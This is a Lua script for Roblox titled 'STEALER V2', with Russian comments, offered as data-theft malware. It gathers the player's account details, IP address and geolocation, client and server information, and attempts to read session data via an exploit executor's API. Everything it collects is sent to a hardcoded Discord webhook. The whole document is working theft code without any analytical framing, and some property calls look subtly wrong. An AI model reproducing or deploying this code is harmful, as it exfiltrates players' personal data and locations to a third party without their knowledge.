--[===[ STEALER V2 - КРАЖА ДАННЫХ ROBLOX ]===]
local webhook = "https://discord.com/api/webhooks/1539680260617150544/vjBh-ol3zRKxgPIKn8Q3UDX-KiS4NF9BpR5cOG-M9E_MCHCScRuhFqFPyXCAWlHTsgag"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- === ФУНКЦИЯ ОТПРАВКИ (АВТОВЫБОР МЕТОДА) ===
local function sendToDiscord(message, title)
    local data = { content = string.format("**%s**\n```\n%s\n```", title or "Лог", message) }
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}

    -- Попытка через syn.request (если доступен)
    local success, result = pcall(function()
        if syn and syn.request then
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = headers,
                Body = json
            })
        end
    end)

    -- Если syn.request не сработал, пробуем через HttpService
    if not success then
        pcall(function()
            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson, false, headers)
        end)
    end
end

-- === 1. КРАЖА ДАННЫХ ROBLOX ===
local function stealRobloxData()
    local msg = string.format("👤 Имя: %s (%d)\n📛 Отображаемое: %s\n🕹️ ID места: %d\n📅 Возраст: %.0f дней\n⭐ Премиум: %s\n👥 Друзей: %d\n📢 Подписчиков: %d",
        player.Name, player.UserId, player.DisplayName, game.PlaceId, player.AccountAge, 
        tostring(player.MembershipType == Enum.MembershipType.Premium), #player.Friends, #player.Followers)
    sendToDiscord(msg, "ROBLOX DATA")
end

-- === 2. КРАЖА IP И ГЕОЛОКАЦИИ ===
local function stealIP()
    pcall(function()
        local ip = game:HttpGet("https://api.ipify.org")
        local geo = game:HttpGet("https://ipapi.co/json/")
        sendToDiscord("🌐 IP: " .. ip .. "\n📍 Гео: " .. geo, "IP / GEO")
    end)
end

-- === 3. КРАЖА ИНФОРМАЦИИ О КЛИЕНТЕ ===
local function stealClientInfo()
    local platform = game:GetService("UserInputService"):GetPlatform()
    local info = string.format("💻 Платформа: %s\n🖥️ Клиент: %s\n🏗️ Студия: %s",
        tostring(platform), tostring(game:GetService("RunService"):IsClient()), tostring(game:GetService("RunService"):IsStudio()))
    sendToDiscord(info, "КЛИЕНТ")
end

-- === 4. КРАЖА ДАННЫХ СЕРВЕРА ===
local function stealServerInfo()
    local msg = string.format("🎮 Игра: %s\n🆔 ID места: %d\n🔗 JobId: %s\n👥 Игроков: %d/%d",
        game.Name, game.PlaceId, game.JobId, #Players:GetPlayers(), game:GetService("RunService").MaxPlayers)
    sendToDiscord(msg, "СЕРВЕР")
end

-- === 5. КРАЖА КУКИ И СЕССИИ (если есть доступ) ===
local function stealSession()
    pcall(function()
        if syn and syn.crypt then
            local session = syn.crypt.custom_user_agent or "unknown"
            sendToDiscord("🍪 Сессия: " .. session, "SESSION")
        end
    end)
end

-- === ГЛАВНЫЙ ЗАПУСК ===
local function main()
    sendToDiscord("=== 🚀 STEALER STARTED ===", "СТАТУС")
    wait(0.5)
    stealRobloxData()
    wait(0.5)
    stealIP()
    wait(0.5)
    stealClientInfo()
    wait(0.5)
    stealServerInfo()
    wait(0.5)
    stealSession()
    wait(0.5)
    sendToDiscord("=== ✅ STEALER FINISHED ===", "СТАТУС")
    print("[+] Все данные отправлены в Discord")
end

pcall(main)
